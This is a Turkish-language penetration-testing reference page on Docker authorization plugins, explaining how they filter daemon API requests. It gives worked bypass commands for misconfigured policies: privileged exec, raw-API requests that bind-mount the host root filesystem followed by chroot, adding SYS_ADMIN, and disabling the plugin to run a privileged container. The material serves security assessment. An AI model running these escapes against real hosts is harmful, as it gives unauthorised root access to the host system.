# Runtime Authorization Plugin'leri

## Genel Bakış

Runtime authorization plugin'leri, bir çağıranın belirli bir daemon işlemini gerçekleştirip gerçekleştiremeyeceğine karar veren ek bir policy katmanıdır. Docker bunun klasik örneğidir. Varsayılan olarak Docker daemon ile iletişim kurabilen herkes, daemon üzerinde fiilen geniş bir kontrole sahip olur. Authorization plugin'leri, kimliği doğrulanmış kullanıcıyı ve istenen API işlemini inceleyerek, ardından policy'ye göre isteğe izin vererek veya isteği reddederek bu modeli daraltmaya çalışır.

Bu konu ayrı bir sayfayı hak eder; çünkü saldırganın zaten bir Docker API'sine veya `docker` grubundaki bir kullanıcıya erişimi olduğunda exploitation modelini değiştirir. Böyle ortamlarda soru artık yalnızca "daemon'a ulaşabilir miyim?" değildir; aynı zamanda "daemon bir authorization katmanıyla çevrelenmiş mi ve çevrelenmişse bu katman işlenmeyen endpoint'ler, zayıf JSON parsing veya plugin-management izinleri üzerinden bypass edilebilir mi?" sorusudur.

## İşleyiş

Bir istek Docker daemon'a ulaştığında authorization subsystem, istek bağlamını kurulu bir veya daha fazla plugin'e iletebilir. Plugin; kimliği doğrulanmış kullanıcı kimliğini, istek ayrıntılarını, seçili header'ları ve content type uygun olduğunda istek veya response body'sinin bazı bölümlerini görür. Birden fazla plugin zincirlenebilir ve erişim yalnızca tüm plugin'ler isteğe izin verirse verilir.

Bu model güçlü görünür; ancak güvenliği tamamen policy yazarının API'yi ne kadar eksiksiz anladığına bağlıdır. `docker run --privileged` komutunu engelleyen ancak `docker exec` işlemini gözden kaçıran, top-level `Binds` gibi alternatif JSON key'lerini fark etmeyen veya plugin administration işlemine izin veren bir plugin, doğrudan privilege-escalation yolları hâlâ açıkken kısıtlama konusunda yanlış bir güven hissi oluşturabilir.

## Yaygın Plugin Hedefleri

Policy incelemesi için önemli alanlar şunlardır:

- container creation endpoint'leri
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` ve namespace-sharing seçenekleri gibi `HostConfig` alanları
- `docker exec` davranışı
- plugin management endpoint'leri
- amaçlanan policy modelinin dışında runtime işlemlerini dolaylı olarak tetikleyebilen tüm endpoint'ler

Geçmişte Twistlock'un `authz` plugin'i ve `authobot` gibi basit eğitim plugin'leri, policy dosyaları ve code path'leri endpoint-to-action mapping işleminin gerçekte nasıl uygulandığını gösterdiği için bu modeli incelemeyi kolaylaştırdı. Assessment çalışmaları açısından önemli ders, policy yazarının yalnızca en görünür CLI komutlarını değil, API surface'in tamamını anlaması gerektiğidir.

## Abuse

İlk amaç, gerçekte neyin engellendiğini öğrenmektir. Daemon bir işlemi reddederse hata çoğu zaman plugin adını leak eder; bu da kullanılan control'ü belirlemeye yardımcı olur:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Daha kapsamlı uç nokta profillemesine ihtiyacınız varsa `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü plugin tarafından hangi API rotalarına ve JSON yapılarına gerçekten izin verildiğini kontrol etme gibi aksi hâlde tekrarlayan görevi otomatikleştirirler.

Ortamda özel bir plugin kullanılıyorsa ve API ile etkileşim kurabiliyorsanız, hangi nesne alanlarının gerçekten filtrelendiğini listeleyin:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Bu kontroller önemlidir; çünkü birçok authorization hatası concept-specific olmaktan ziyade field-specific'tir. Bir plugin, eşdeğer API yapısını tamamen engellemeden bir CLI pattern'ini reddedebilir.

### Tam Örnek: `docker exec` Container oluşturulduktan sonra Privilege ekler

Privileged container oluşturmayı engelleyen, ancak unconfined container oluşturulmasına ve `docker exec` kullanımına izin veren bir policy yine de bypass edilebilir:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Daemon ikinci adımı kabul ederse kullanıcı, policy yazarının kısıtlı olduğuna inandığı bir container içinde ayrıcalıklı bir etkileşimli process elde etmiş olur.

### Tam Örnek: Raw API Üzerinden Bind Mount

Bazı hatalı policy'ler yalnızca tek bir JSON biçimini inceler. Root filesystem bind mount tutarlı şekilde engellenmezse host yine mount edilebilir:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Aynı fikir `HostConfig` altında da görülebilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Etki, ana makinenin tüm dosya sisteminden çıkıştır. İlginç ayrıntı, bypass işleminin bir kernel bug'ından değil, eksik policy kapsamından kaynaklanmasıdır.

### Full Example: Unchecked Capability Attribute

Policy, capability ile ilgili bir attribute'u filtrelemeyi unutursa attacker, tehlikeli bir capability'yi yeniden kazanan bir container oluşturabilir:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` veya benzer şekilde güçlü bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) içinde açıklanan birçok breakout tekniği kullanılabilir hale gelir.

### Tam Örnek: Plugin'i Devre Dışı Bırakma

Plugin-management işlemlerine izin veriliyorsa, en temiz bypass kontrolü tamamen kapatmak olabilir:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Bu, control-plane düzeyinde bir policy hatasıdır. Authorization katmanı mevcut olsa da kısıtlaması gereken kullanıcı, bu katmanı devre dışı bırakma yetkisini hâlâ elinde bulundurur.

## Kontroller

Bu komutlar, bir policy katmanının mevcut olup olmadığını ve eksiksiz mi yoksa yüzeysel mi göründüğünü belirlemeyi amaçlar.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Burada ilginç olanlar:

- Bir plugin adı içeren denial mesajları, bir authorization katmanının varlığını doğrular ve genellikle tam implementation'ı açığa çıkarır.
- Attacker tarafından görülebilen bir plugin listesi, disable veya reconfigure işlemlerinin mümkün olup olmadığını keşfetmek için yeterli olabilir.
- Yalnızca açık CLI eylemlerini engelleyen, ancak raw API request'lerini engellemeyen bir policy, aksi kanıtlanana kadar bypass edilebilir olarak değerlendirilmelidir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Bir authorization plugin'i yapılandırılmadığı sürece daemon erişimi fiilen all-or-nothing durumundadır | eksik plugin policy'si, allowlist yerine blacklist kullanılması, plugin yönetimine izin verilmesi, field-level blind spot'lar |
| Podman | Yaygın bir direct equivalent değil | Podman genellikle Docker tarzı authz plugin'lerinden ziyade Unix permissions, rootless execution ve API exposure kararlarına dayanır | rootful Podman API'sinin geniş biçimde expose edilmesi, zayıf socket permissions |
| containerd / CRI-O | Farklı bir control model | Bu runtime'lar genellikle Docker authz plugin'leri yerine socket permissions, node trust boundary'leri ve higher-layer orchestrator kontrollerine dayanır | socket'in workload'lara mount edilmesi, zayıf node-local trust varsayımları |
| Kubernetes | Docker authz plugin'leri yerine API-server ve kubelet katmanlarında authn/authz kullanır | Cluster RBAC ve admission control'leri ana policy katmanıdır | aşırı geniş RBAC, zayıf admission policy, kubelet veya runtime API'lerinin doğrudan expose edilmesi |

{{#include ../../../banners/hacktricks-training.md}}
